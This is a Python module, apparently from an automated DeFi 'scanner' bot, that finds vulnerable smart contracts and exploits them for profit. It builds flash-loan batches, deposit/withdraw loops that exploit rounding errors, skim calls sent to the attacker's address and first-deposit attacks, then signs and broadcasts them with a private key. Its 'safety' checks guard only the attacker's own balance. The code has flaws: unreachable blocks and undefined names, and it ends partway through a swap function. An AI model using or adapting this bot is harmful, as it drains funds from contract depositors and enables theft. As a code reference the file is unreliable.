import logging
import time
import traceback
import os
from typing import Dict, Any, Optional, Tuple
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from scanner.config import (
    AUTO_EXPLOIT,
    PRIVATE_KEY,
    MY_WALLET_ADDRESS,
    MAX_BET_SIZE_WEI,
    MAX_FEE_PER_GAS,
    MAX_PRIORITY_FEE,
    RPC_HTTP,
    WETH_ADDRESS,
    UNISWAP_V3_ROUTER,
    FLASH_LOAN_EXECUTOR_ADDRESS,
    KEY_TOKENS,
    USE_FLASHLOAN,
    MAX_GAS_PRICE_GWEI,
    MIN_NET_PROFIT_USD
)

from scanner.simulation import run_honeypot_simulation_eth, run_honeypot_simulation_token
from scanner.proxy_resolver import resolve_proxy
from scanner.impact_calculator import get_token_price_in_weth

FLASH_LOAN_ABI = [
    {
        "inputs": [
            {"internalType": "address[]", "name": "targets", "type": "address[]"},
            {"internalType": "bytes[]", "name": "payloads", "type": "bytes[]"},
            {"internalType": "uint256[]", "name": "values", "type": "uint256[]"},
            {"internalType": "uint256", "name": "loanAmount", "type": "uint256"}
        ],
        "name": "executeWithFlashLoan",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

logger = logging.getLogger(__name__)

SAFE_DEPOSIT_AMOUNT = min(int(0.0001 * 10**18), MAX_BET_SIZE_WEI)

BLACKLIST_TTL_SECONDS = 24 * 60 * 60
_GARBAGE_PROXY_CODEHASH_BLACKLIST: Dict[str, float] = {}

FLASH_LOAN_FEE_BPS = 9
FLASH_LOAN_AMOUNT_WEI = int(20 * 10**18)

_SESSION_GAS_SPENT_WEI: int = 0
_SESSION_GAS_LIMIT_WEI: int = int(0.0006 * 10**18)


def _get_usdc_address() -> str:
    if KEY_TOKENS and len(KEY_TOKENS) > 1:
        return KEY_TOKENS[1]
    return "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"


def _wei_to_usd(w3: Web3, amount_wei: int) -> float:
    if amount_wei <= 0:
        return 0.0
    try:
        usdc = Web3.to_checksum_address(_get_usdc_address())
        weth_per_usdc = get_token_price_in_weth(w3, usdc, 10**6)
        if weth_per_usdc <= 0:
            raise ValueError("zero quote")
        return float(amount_wei) / float(weth_per_usdc)
    except Exception:
        approx_eth_price_usd = 2000.0
        return float(amount_wei) / 10**18 * approx_eth_price_usd


def _compute_dynamic_fees(w3: Web3, estimated_gas: int, gross_profit_wei: int) -> Tuple[int, int, int]:
    base_fee_raw = w3.eth.gas_price or MAX_FEE_PER_GAS
    base_fee = max(1, int(base_fee_raw))
    max_gas_price = int(os.getenv("MAX_GAS_PRICE_WEI", "0") or "0")
    if max_gas_price > 0 and base_fee > max_gas_price:
        base_fee = max_gas_price
    target_gas_budget = int(gross_profit_wei * 0.8) if gross_profit_wei > 0 else 0
    if target_gas_budget <= 0 or estimated_gas <= 0:
        total = base_fee
        gas_cost = total * max(0, int(estimated_gas))
        return total, 0, gas_cost
    max_total_fee_per_gas = target_gas_budget // estimated_gas
    if max_total_fee_per_gas <= base_fee:
        total = base_fee
        gas_cost = total * max(0, int(estimated_gas))
        return total, 0, gas_cost
    allowed_priority = max_total_fee_per_gas - base_fee
    priority = min(MAX_PRIORITY_FEE, allowed_priority)
    priority = int(priority * 1.2)
    if max_gas_price > 0 and base_fee + priority > max_gas_price:
        priority = max(max_gas_price - base_fee, 0)
    total_fee = base_fee + priority
    gas_cost = total_fee * estimated_gas
    return total_fee, priority, gas_cost


def _is_blacklisted_code_hash(code_hash: Optional[str]) -> bool:
    if not code_hash:
        return False
    now = time.time()
    ts = _GARBAGE_PROXY_CODEHASH_BLACKLIST.get(code_hash)
    if ts is None:
        return False
    if now - ts > BLACKLIST_TTL_SECONDS:
        try:
            del _GARBAGE_PROXY_CODEHASH_BLACKLIST[code_hash]
        except KeyError:
            pass
        return False
    return True


def _blacklist_code_hash(code_hash: Optional[str]) -> None:
    if not code_hash:
        return
    _GARBAGE_PROXY_CODEHASH_BLACKLIST[code_hash] = time.time()

def _exploit_flash_loan(w3: Web3, account, target: str, nonce: int, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Optional[str]:
    if not USE_FLASHLOAN:
        # print(f"[EXPLOIT] USE_FLASHLOAN disabled. Skipping exploit for {target}.", flush=True)
        return None

    if not FLASH_LOAN_EXECUTOR_ADDRESS:
        # print("[EXPLOIT] FLASH_LOAN_EXECUTOR_ADDRESS not configured. Skipping exploit.", flush=True)
        return None

    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit, token_address = _check_withdrawal_safety(w3, target, bug_type, details)
    
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting.", flush=True)
        return None
        
    # SAFETY: Check balance for Flash Loan usage
    # Flash loans cost ~200k gas. On Base, gas is cheap, so we can lower this threshold.
    # 0.001 ETH (~$3) should be enough for many attempts on Base.
    try:
        bal = w3.eth.get_balance(account.address)
        if bal < 1000000000000000: # 0.001 ETH (Lowered from 0.005 ETH for Base)
             print(f"[EXPLOIT] Balance {w3.from_wei(bal, 'ether')} ETH too low for Flash Loan risks. Skipping.", flush=True)
             return None
    except:
        pass

    if token_address and bug_type != "sequencer_fee":
        print(f"[EXPLOIT] Token Vault detected. Flash Loan logic for tokens not yet implemented. Skipping live exploit.", flush=True)
        return None

    effective_loan_amount = None
    if details and isinstance(details, dict):
        try:
            v = details.get("effective_loan_amount_wei")
            if isinstance(v, int) and v > 0:
                effective_loan_amount = v
        except Exception:
            effective_loan_amount = None

    loan_amount = effective_loan_amount or FLASH_LOAN_AMOUNT_WEI
    
    # Try loop: full amount, then half amount
    current_loan_amount = loan_amount
    
    profit_threshold = w3.to_wei(0.01, "ether")

    for attempt in range(2):
        try:
            flash_fee = abs(int(current_loan_amount)) * FLASH_LOAN_FEE_BPS // 10000

            estimated_gas = 1500000
            total_fee_per_gas, priority_fee, gas_cost = _compute_dynamic_fees(w3, estimated_gas, simulated_profit)

            if simulated_profit > profit_threshold:
                try:
                    block = w3.eth.get_block("latest")
                    base_fee_block = block.get("baseFeePerGas", 0)
                except Exception:
                    base_fee_block = 0
                if base_fee_block > 0:
                    avg_priority = max(total_fee_per_gas - base_fee_block, 1)
                    boosted_priority = int(avg_priority * 1.2)
                    if MAX_PRIORITY_FEE > 0:
                        boosted_priority = min(boosted_priority, MAX_PRIORITY_FEE)
                    priority_fee = boosted_priority
                    total_fee_per_gas = base_fee_block + priority_fee

            gross_profit = simulated_profit
            net_profit_wei = gross_profit - flash_fee - gas_cost
            potential_usd = _wei_to_usd(w3, gross_profit)
            gas_usd = _wei_to_usd(w3, gas_cost)
            net_profit_usd = _wei_to_usd(w3, net_profit_wei)

            net_profit_eth = w3.from_wei(net_profit_wei, "ether")
            # print(f"[FLASH-ATTACK] Target: {target} | Expected Net Profit: {net_profit_eth} ETH | Loan: {w3.from_wei(current_loan_amount, 'ether')} ETH", flush=True)

            if net_profit_usd < MIN_NET_PROFIT_USD:
                # Exception for Rounding Drift and Sequencer Fee
                if (bug_type == "vault_rounding_dust" and withdraw_method == "rounding_drift") or \
                   (bug_type == "sequencer_fee"):
                    print(f"[EXPLOIT] Bypassing profit check for {bug_type} ({withdraw_method}). Aggressive mode.", flush=True)
                elif attempt == 0:
                    print(f"[SKIP] Below break-even. Potential: ${potential_usd:.2f}, Gas: ${gas_usd:.2f}", flush=True)
                    return None
                else:
                    pass # print(f"[WARN] Retrying with lower amount despite profit check...", flush=True)

            executor = w3.eth.contract(address=FLASH_LOAN_EXECUTOR_ADDRESS, abi=FLASH_LOAN_ABI)
            
            # Construct Batch Payload
            targets = []
            payloads = []
            values = []
            
            # 1. Deposit
            # Try generic deposit() - d0e30db0
            targets.append(target)
            
            if bug_type == "sequencer_fee":
                # Special handling for Sequencer Fee
                # We do NOT do deposit->withdraw. We just trigger the vulnerability once.
                # Method determined from simulation result
                if withdraw_method and "fallback_wei" in withdraw_method:
                     # Fallback: Raw call with 1 wei
                     payloads.append(b"")
                     values.append(1) # 1 wei
                elif withdraw_method and withdraw_method.startswith("deep_search_"):
                     # Extract selector
                     selector_hex = withdraw_method.split("_")[-1] # "0x..."
                     # Selector is 4 bytes.
                     payload = bytes.fromhex(selector_hex[2:])
                     if selector_hex.lower() == "0xbc25cf77": # skim(address)
                         # Add attacker address padded to 32 bytes
                         payload += bytes.fromhex(account.address[2:].zfill(64))
                     
                     payloads.append(payload)
                     values.append(0) # Try 0 value first (safest for non-payable)
                else:
                     # Default: execute() - 0x61461954
                     # Value: 0.0001 ether as per simulation
                     # NOTE: Some sequencer fee bugs require SPECIFIC value (e.g. 1 wei, or > fee)
                     # We stick to 0.0001 ETH as a safe bet unless simulation said otherwise.
                     payloads.append(bytes.fromhex("61461954"))
                     values.append(100000000000000) # 0.0001 ETH
                
                # No withdraw step needed for sequencer_fee (the trigger is the exploit)
            
            elif bug_type == "vault_rounding_dust":
                # Rounding Dust Strategy: Loop Deposit/Withdraw to accumulate precision loss
                # We use the full loan amount to maximize impact, then loop small withdrawals or full cycles.
                
                if withdraw_method == "rounding_drift":
                    # Special strategy for Rounding Drift (Price Increase):
                    # Deposit All -> Withdraw 1 wei -> Withdraw Remaining (Shares)
                    # We avoid the loop because Price Increase means we lose equity on partial withdraws/deposits.
                    
                    # 1. Deposit All
                    payloads.append(bytes.fromhex("d0e30db0"))
                    values.append(abs(int(current_loan_amount)))
                    targets.append(target)
                    
                    # 2. Withdraw 1 wei
                    targets.append(target)
                    values.append(0)
                    payloads.append(bytes.fromhex("2e1a7d4d") + (1).to_bytes(32, 'big'))
                    
                    # 3. Withdraw All (Remaining)
                    # Use withdrawAll() -> 853828b6
                    targets.append(target)
                    values.append(0)
                    payloads.append(bytes.fromhex("853828b6"))
                    
                else:
                    # Strategy: Deposit All -> [Withdraw (90%) -> Deposit (90%)] * 5 -> Withdraw All
                    
                    # 1. Deposit All
                    payloads.append(bytes.fromhex("d0e30db0"))
                    values.append(abs(int(current_loan_amount)))
                    targets.append(target)
                    
                    # 2. Loop (5 times)
                    loop_amt = abs(int(current_loan_amount)) * 9 // 10 # 90%
                    for _ in range(5):
                        # Withdraw 90%
                        targets.append(target)
                        values.append(0)
                        # withdraw(uint256) -> 2e1a7d4d
                        payloads.append(bytes.fromhex("2e1a7d4d") + loop_amt.to_bytes(32, 'big'))
                        
                        # Deposit 90%
                        targets.append(target)
                        values.append(loop_amt) # value must match for deposit
                        payloads.append(bytes.fromhex("d0e30db0"))

                    # 3. Final Withdraw All
                    targets.append(target)
                    values.append(0)
                    # withdraw(uint256) -> 2e1a7d4d
                    payloads.append(bytes.fromhex("2e1a7d4d") + abs(int(current_loan_amount)).to_bytes(32, 'big'))

            else:
                # Generic Exploit Strategy
                
                # Check for Deep Search success (standalone selector)
                if withdraw_method and withdraw_method.startswith("deep_search_"):
                     selector_hex = withdraw_method.split("_")[-1] # "0x..."
                     payload = bytes.fromhex(selector_hex[2:])
                     if selector_hex.lower() == "0xbc25cf77": # skim(address)
                         payload += bytes.fromhex(account.address[2:].zfill(64))
                     
                     # targets[0] is already set
                     payloads.append(payload)
                     values.append(0)
                else:
                    # Standard Deposit -> Withdraw
                    
                    # 1. Deposit
                    payloads.append(bytes.fromhex("d0e30db0"))
                    values.append(abs(int(current_loan_amount)))

                    # 2. Withdraw
                    targets.append(target)
                    values.append(abs(int(0)))
                    
                    if withdraw_method == "withdrawAll":
                        payloads.append(bytes.fromhex("853828b6"))
                    elif withdraw_method == "withdraw(uint256)":
                        # Fix: Use actual loan amount for withdraw argument
                        payloads.append(bytes.fromhex("2e1a7d4d") + abs(int(current_loan_amount)).to_bytes(32, 'big'))
                    else:
                        # Default to withdraw()
                        payloads.append(bytes.fromhex("3ccfd60b"))

            tx_params = {
                'from': account.address,
                'nonce': nonce,
                'gas': estimated_gas,
            }

            if priority_fee > 0:
                tx_params['maxFeePerGas'] = int(total_fee_per_gas)
                tx_params['maxPriorityFeePerGas'] = int(priority_fee)
                tx_params['type'] = 2
            else:
                # Fallback for chains without EIP-1559 or explicit legacy request
                # For Base/OP stack, we generally prefer EIP-1559 (type 2)
                # But if priority_fee is 0, we might be falling back to legacy?
                # The user error "Unknown Transaction type: 0" strongly suggests type 0 is problematic or not supported/malformed.
                # Let's force type 2 (EIP-1559) and set fees explicitly if they weren't set.
                
                # Get current fees if not set
                block = w3.eth.get_block('latest')
                base_fee = block.get('baseFeePerGas', 1000000000) # Default 1 gwei
                max_prio = 100000000 # 0.1 gwei default
                
                tx_params['maxFeePerGas'] = int(base_fee * 2 + max_prio)
                tx_params['maxPriorityFeePerGas'] = int(max_prio)
                tx_params['type'] = 2 
                # Remove legacy gasPrice if present
                tx_params.pop('gasPrice', None)

            tx = executor.functions.executeWithFlashLoan(
                targets,
                payloads,
                values,
                abs(int(current_loan_amount))
            ).build_transaction(tx_params)
            
            signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return tx_hash.hex()

        except Exception as e:
            print(f"[EXPLOIT] Flash Loan Tx Construction Failed (Amount: {current_loan_amount}): {e}", flush=True)
            if attempt == 0:
                print(f"[EXPLOIT] Retrying with half amount...", flush=True)
                current_loan_amount = current_loan_amount // 2
                continue
            else:
                return None
    return None


def execute_cautious_exploit(
    w3: Web3, 
    contract_address: str, 
    bug_type: str, 
    details: Optional[Dict[str, Any]] = None
) -> None:
    """
    Execute a cautious live exploit:
    1. Minimal Deposit (SAFE_DEPOSIT_AMOUNT)
    2. Immediate Withdraw (All)
    
    Args:
        w3: Web3 instance
        contract_address: Target contract
        bug_type: Type of bug found
        details: Additional bug details
    """
    global _SESSION_GAS_SPENT_WEI

    if not AUTO_EXPLOIT:
        print(f"[ANALYZE] AUTO_EXPLOIT=False. Running simulation-only for {contract_address} ({bug_type})", flush=True)
        try:
            _check_withdrawal_safety(w3, contract_address, bug_type, details)
        except Exception as e:
            logger.error(f"[ANALYZE] Simulation-only check failed for {contract_address}: {e}")
        return
    if not PRIVATE_KEY:
        logger.info("[EXPLOIT] No private key found in config. Cannot execute.")
        return

    if _SESSION_GAS_SPENT_WEI >= _SESSION_GAS_LIMIT_WEI:
        # print(f"[EXPLOIT] Session gas limit reached. Skipping all new exploits.", flush=True)
        return

    try:
        account = Account.from_key(PRIVATE_KEY)
        my_address = account.address
        nonce = w3.eth.get_transaction_count(my_address)
        
        # --- PROFIT TRACKING START ---
        start_balance = w3.eth.get_balance(my_address)
        # -----------------------------

        # print(f"[EXPLOIT] Preparing cautious exploit for {contract_address} ({bug_type})...", flush=True)
        
        last_tx_hash = None

        # 1. Determine Payload based on bug type
        # Default strategy: Deposit -> Withdraw
        
        # Common Selectors
        # deposit() -> d0e30db0
        # deposit(uint256) -> b6b55f25
        # withdraw() -> 3ccfd60b
        # withdraw(uint256) -> 2e1a7d4d
        # withdrawAll() -> 853828b6
        
        # We will try to construct a "multicall" if supported, or send two transactions.
        # Sending two transactions is risky (atomicity), but for "cautious live exploit" 
        # checking generic bugs, it might be the only way without a custom smart contract.
        
        # However, for Context Leak (multicall), we MUST use multicall in one tx.
        
        if bug_type == "context_leak_multicall":
            # Safety Check for Context Leak
            # We must simulate the specific multicall payload to be sure.
            # For now, to be absolutely safe, we skip unless we implement a specific simulation.
            # OR we can try the generic safety check as a weak proxy, but that's risky.
            # BETTER: Disable for now to protect funds until specialized simulation is ready.
            # print(f"[EXPLOIT] Skipping Context Leak for {contract_address} to guarantee safety (Simulation pending).", flush=True)
            last_tx_hash = _exploit_context_leak(w3, account, contract_address, nonce)
            
        elif bug_type == "sync_loss":
            # print(f"[EXPLOIT] Skipping Sync Loss for {contract_address} (Gas saving mode - usually yields dust/tokens, not ETH).", flush=True)
            last_tx_hash = _exploit_sync_loss(w3, account, contract_address, nonce)
            
        elif bug_type == "ghost_liquidity":
            # print(f"[EXPLOIT] Skipping Ghost Liquidity for {contract_address} (Gas saving mode - speculative ownership claim).", flush=True)
            last_tx_hash = _exploit_ghost_liquidity(w3, account, contract_address, nonce, details)
            
        elif bug_type == "timestamp_dependence":
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "sequencer_fee":
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "vault_rounding_dust":
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "confirmed_inflation_attack":
            last_tx_hash = _exploit_first_deposit(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "first_deposit_risk":
            last_tx_hash = _exploit_first_deposit(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "fot_misaccounting_vault":
            # User requested NO passive reporting.
            # Since we can't exploit FoT without tokens/capital, just return silently.
            return

        elif bug_type == "self_destruct":
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "blind_withdrawal":
            # Just try flash loan cycle (Deposit -> Withdraw) or Sequencer Fee style if simulation said so
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "phantom_recovery":
            last_tx_hash = _exploit_phantom_recovery(w3, account, contract_address, nonce, details)

        else:
            # Default strategy: Deposit -> Withdraw
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce, bug_type, details)

        # --- PROFIT CALCULATION ---
        if last_tx_hash:
            print(f"[EXPLOIT] Waiting for confirmation of {last_tx_hash}...", flush=True)
            try:
                receipt = w3.eth.wait_for_transaction_receipt(last_tx_hash, timeout=60)
                gas_used = receipt.gasUsed if receipt and hasattr(receipt, "gasUsed") else 0
                fee_per_gas = w3.eth.gas_price
                if gas_used and fee_per_gas:
                    _SESSION_GAS_SPENT_WEI += int(gas_used) * int(fee_per_gas)
                end_balance = w3.eth.get_balance(my_address)
                profit = end_balance - start_balance
                print(f"[RESULT] Execution Finished. Net Profit: {profit} wei ({w3.from_wei(profit, 'ether')} ETH)", flush=True)
            except Exception as e:
                # Handle specific Web3 error: value must be between 1 and 2**256 - 1
                # This usually happens when fetching gas_price fails or is 0/None in some context, 
                # OR when w3.eth.gas_price returns None on some chains/nodes.
                # Let's try to get receipt details safely.
                if "value must be between" in str(e):
                     print(f"[RESULT] Execution Finished (Receipt fetch glitch). Check block explorer for {last_tx_hash}.", flush=True)
                else:
                     print(f"[RESULT] Could not fetch final balance/receipt: {e}", flush=True)
        # -----------------------------

    except Exception as e:
        logger.error(f"[EXPLOIT] Failed: {e}")
        print(f"[EXPLOIT] Failed: {e}", flush=True)
        tb = traceback.format_exc()
        print(f"[EXPLOIT] TRACEBACK:\n{tb}", flush=True)
    finally:
        pass


def _check_withdrawal_safety(w3: Web3, contract_address: str, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Tuple[bool, Optional[str], int, Optional[str]]:
    """
    Run local simulation to verify we can withdraw.
    Returns: (is_safe, method_name, simulated_profit, token_address)
    """
    print(f"[SAFETY] Checking if {contract_address} is a Token Vault or ETH Vault...", flush=True)
    
    if bug_type not in ("sequencer_fee",):
        try:
            deadline = time.time() + 60
            while True:
                bal = w3.eth.get_balance(contract_address)
                if bal > 0:
                    break
                if time.time() >= deadline:
                    print(f"[SAFETY] Skipping simulation for {contract_address}: Zero balance.", flush=True)
                    return False, None, 0, None
                time.sleep(2)
        except Exception:
            pass

    impl_addr = details.get("implementation_address") if details else None
    if impl_addr:
        try:
            if int(impl_addr, 16) == 0:
                print(f"[SAFETY] Proxy implementation for {contract_address} resolved to zero address. Skipping simulation.", flush=True)
                return False, None, 0, None
        except Exception:
            pass
    else:
        try:
            proxy_info = resolve_proxy(w3, contract_address)
            if proxy_info.get("is_proxy"):
                impl_addr = proxy_info.get("implementation")
                print(f"[SAFETY] Resolved Proxy Implementation: {impl_addr}", flush=True)
                if not impl_addr:
                    print(f"[SAFETY] Proxy implementation for {contract_address} not found in EIP-1967 slots. Skipping simulation.", flush=True)
                    return False, None, 0, None
        except Exception:
            pass

    code_hash = None
    try:
        target_for_hash = impl_addr if impl_addr else contract_address
        code = w3.eth.get_code(Web3.to_checksum_address(target_for_hash))
        if code:
            code_hash = Web3.keccak(code).hex()
            if _is_blacklisted_code_hash(code_hash):
                print(f"[SAFETY] Code hash {code_hash} is blacklisted. Skipping simulation for {contract_address}.", flush=True)
                return False, None, 0, None
    except Exception:
        code_hash = None

    # 1. Detect Asset/Token
    token_address = None
    
    # List of selectors to check for underlying token
    # asset() -> 0x38d52e0f
    # token() -> 0xfc0c546a
    # underlying() -> 0x6f307dc3
    # want() -> 0x1f1f897f
    # stakingToken() -> 0x72f702f3
    # lpToken() -> 0x7f23340e
    token_selectors = [
        "asset()", 
        "token()", 
        "underlying()", 
        "want()", 
        "stakingToken()",
        "lpToken()"
    ]
    
    for selector_text in token_selectors:
        try:
            call_data = w3.keccak(text=selector_text)[:4]
            token_call = w3.eth.call({"to": contract_address, "data": call_data})
            if len(token_call) >= 32:
                # Basic validation: check if it looks like an address (not all zeros)
                addr_candidate = w3.to_checksum_address(token_call[-20:])
                if int(addr_candidate, 16) != 0:
                    token_address = addr_candidate
                    # print(f"[SAFETY] Resolved Token via {selector_text}: {token_address}", flush=True)
                    break
        except Exception:
            pass
        
    if not token_address:
        # Fallback 2: Check for balances of Major Tokens (WETH, USDC)
        # If the contract holds a major token, it's likely the asset it manages.
        for common_token in KEY_TOKENS:
             try:
                 bal_call = w3.eth.call({
                     "to": common_token, 
                     "data": w3.keccak(text="balanceOf(address)")[:4] + w3.to_checksum_address(contract_address)[2:].zfill(64)
                 })
                 balance = int(bal_call.hex(), 16)
                 if balance > 0:
                     token_address = common_token
                     # print(f"[SAFETY] Resolved Token via Balance Check: {token_address}", flush=True)
                     break
             except:
                 pass

    if not token_address:
        # Fallback 3: Storage Slot X-Ray (The "Nuclear" Option)
        # Read raw storage slots 0-5 to find any address-like value that is a contract.
        # print(f"[SAFETY] Token detection via selectors failed. Attempting Storage Slot X-Ray...", flush=True)
        for slot in range(6):
            try:
                slot_val = w3.eth.get_storage_at(contract_address, slot)
                # Convert last 20 bytes to address
                addr_hex = w3.to_checksum_address("0x" + slot_val.hex()[-40:])
                
                if int(addr_hex, 16) == 0:
                    continue
                    
                # Check if it's a contract (has code)
                if len(w3.eth.get_code(addr_hex)) > 0:
                     # Check if it looks like an ERC20 (has decimals)
                     try:
                         w3.eth.call({"to": addr_hex, "data": w3.keccak(text="decimals()")[:4]})
                         token_address = addr_hex
                         print(f"[SAFETY] Resolved Token via Storage Slot {slot}: {token_address}", flush=True)
                         break
                     except:
                         pass
            except:
                pass

    # 2. Run Appropriate Simulation
    if token_address:
        # print(f"[SAFETY] Detected Token Vault. Asset: {token_address}. Running Full Cycle (Swap->Dep->With->Swap)...", flush=True)
        res = run_honeypot_simulation_token(contract_address, token_address, RPC_HTTP, WETH_ADDRESS, UNISWAP_V3_ROUTER, w3=w3, implementation_address=impl_addr, bug_type=bug_type)
    else:
        # print(f"[SAFETY] Detected ETH Vault. Running Deposit->Withdraw...", flush=True)
        res = run_honeypot_simulation_eth(contract_address, RPC_HTTP, w3=w3, implementation_address=impl_addr, bug_type=bug_type)

    net_profit_wei = 0
    if res.get("safe"):
        method = res.get("method")
        profit = res.get("simulated_profit", 0)

        loan_amount = int(res.get("loan_amount_wei", FLASH_LOAN_AMOUNT_WEI))
        if loan_amount < 0:
            loan_amount = abs(loan_amount)
        flash_fee = loan_amount * FLASH_LOAN_FEE_BPS // 10000
        estimated_gas = 1500000
        _, _, gas_cost = _compute_dynamic_fees(w3, estimated_gas, profit)
        net_profit_wei = profit - flash_fee - gas_cost
    if bug_type == "sequencer_fee" and net_profit_wei <= 0:
         # Special handling for Sequencer Fee:
         # User feedback: "This will drain balance". We must enforce profit check.
         # We only proceed if the simulation proves we make money (or break even).
         print(f"[SAFETY] Sequencer Fee simulation yielded {net_profit_wei} wei. Aborting to protect balance.", flush=True)
         return False, None, 0, token_address
         # return True, "execute()", 0, token_address # Force proceed - DISABLED for safety

    if bug_type == "vault_rounding_dust" and method == "rounding_drift":
         print(f"[SAFETY] Rounding Drift detected (Simulated Profit: {profit} wei). Proceeding with Flash Loan exploit despite low profit check.", flush=True)
         return True, method, profit, token_address

    if bug_type != "sequencer_fee" and net_profit_wei <= 0:
        # print(f"[SAFETY] Simulation profit after flash fee and gas is non-positive ({net_profit_wei} wei) for {contract_address}. Treating as unsafe.", flush=True)
        if code_hash:
            _blacklist_code_hash(code_hash)
        return False, None, 0, token_address
        if net_profit_wei < 0:
            net_profit_eth = -w3.from_wei(abs(int(net_profit_wei)), "ether")
        else:
            net_profit_eth = w3.from_wei(int(net_profit_wei), "ether")
        loan_amount_eth = w3.from_wei(int(loan_amount), "ether")
        # print(f"[FLASH-PROFIT] Predicted profit with {loan_amount_eth} ETH: {net_profit_eth} ETH", flush=True)

        if details is not None:
            try:
                details["effective_loan_amount_wei"] = int(loan_amount)
            except Exception:
                pass

        if profit <= 0:
            print(f"[SAFETY] Simulation yielded non-positive profit ({profit} wei) for {contract_address}. Treating as unsafe.", flush=True)
            if code_hash:
                _blacklist_code_hash(code_hash)
            return False, None, 0, token_address
        print(f"[SAFETY] Simulation PASSED. Method: {method}, Profit: {profit} wei", flush=True)
        return True, method, profit, token_address
    else:
        print(f"[SAFETY] Simulation FAILED. Error: {res.get('error')}", flush=True)
        if code_hash:
            _blacklist_code_hash(code_hash)
        return False, None, 0, None


def _get_quote(w3: Web3, token_in: str, token_out: str, fee: int, amount_in: int) -> int:
    """
    Get quote from Uniswap V3 Quoter.
    """
    # Interface: function quoteExactInputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)
    # Selector: f7729d3f
    
    encoded = encode(
        ['address', 'address', 'uint24', 'uint256', 'uint160'],
        [token_in, token_out, fee, amount_in, 0]
    )
    data = bytes.fromhex("f7729d3f") + encoded
    
    try:
        result = w3.eth.call({
            "to": UNISWAP_V3_QUOTER,
            "data": data
        })
        amount_out = decode(['uint256'], result)[0]
        return amount_out
    except Exception as e:
        # Try checking if it's QuoterV2 (different selector?) or just no liquidity
        # QuoterV2 quoteExactInputSingleParams is a struct.
        # For now assume QuoterV1 or failure means no liquidity.
        print(f"[QUOTE] Failed to get quote (Fee {fee}): {e}", flush=True)
        return 0


def _swap_eth_to_token(w3: Web3, account, token_out: str, amount_eth: int, nonce: int) -> Optional[str]:
    """Swap ETH -> Token on Uniswap V3 (or compatible)"""
    print(f"[SWAP] Swapping {amount_eth} wei ETH -> {token_out}...", flush=True)
    
    # 1. Get Quote to set MinAmountOut (Slippage protection)
    # Try fees: 3000, 500, 10000
    fee = 3000
    amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
        
    if amount_out_quoted == 0:
        print("[SWAP] No liquidity found for swap. Aborting.", flush=True)
        return nonce

    # Apply 0.5% Slippage
    amount_out_min = int(amount_out_quoted * 0.995)
    print(f"[SWAP] Quote: {amount_out_quoted} tokens. Min (0.5% slip): {amount_out_min}. Fee: {fee}", flush=True)

    # 2. Wrap ETH
    weth = w3.eth.contract(address=WETH_ADDRESS, abi=[
        {"constant":False,"inputs":[],"name":"deposit","outputs":[],"payable":True,"type":"function"},
        {"constant":False,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":False,"type":"function"}
    ])
    
    # Send wrap tx
    # EIP-1559 Fees
    try:
        block = w3.eth.get_block('latest')
        base_fee = block.get('baseFeePerGas', 1000000000)
    except:
        base_fee = 1000000000
    max_prio = 100000000 # 0.1 gwei
    max_fee = int(base_fee * 2 + max_prio)

    tx_wrap = weth.functions.deposit().build_transaction({
        'from': account.address,
        'value': amount_eth,
        'nonce': nonce,
        'gas': 50000,
        'maxFeePerGas': max_fee,
        'maxPriorityFeePerGas': max_prio,
        'type': 2
    })
    signed_wrap = w3.eth.account.sign_transaction(tx_wrap, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_wrap.rawTransaction)
    nonce += 1
    
    # 3. Approve Router
    tx_app = weth.functions.approve(UNISWAP_V3_ROUTER, amount_eth).build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 50000,
        'maxFeePerGas': max_fee,
        'maxPriorityFeePerGas': max_prio,
        'type': 2
    })
    signed_app = w3.eth.account.sign_transaction(tx_app, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_app.rawTransaction)
    nonce += 1

    # 4. Swap (ExactInputSingle)
    # params tuple: (tokenIn, tokenOut, fee, recipient, deadline, amountIn, amountOutMin, sqrtPriceLimitX96)
    params = (
        WETH_ADDRESS,
        token_out,
        fee,
        account.address,
        int(time.time()) + 60, # 60s deadline
        amount_eth,
        amount_out_min, # Slippage Enforced
        0
    )
    
    # exactInputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_swap = {
        'from': account.address,
        'to': UNISWAP_V3_ROUTER,
        'value': 0,
        'data': data,
        'nonce': nonce,
        'gas': 200000,
        'maxFeePerGas': max_fee,
        'maxPriorityFeePerGas': max_prio,
        'type': 2
    }
    
    signed_swap = w3.eth.account.sign_transaction(tx_swap, PRIVATE_KEY)
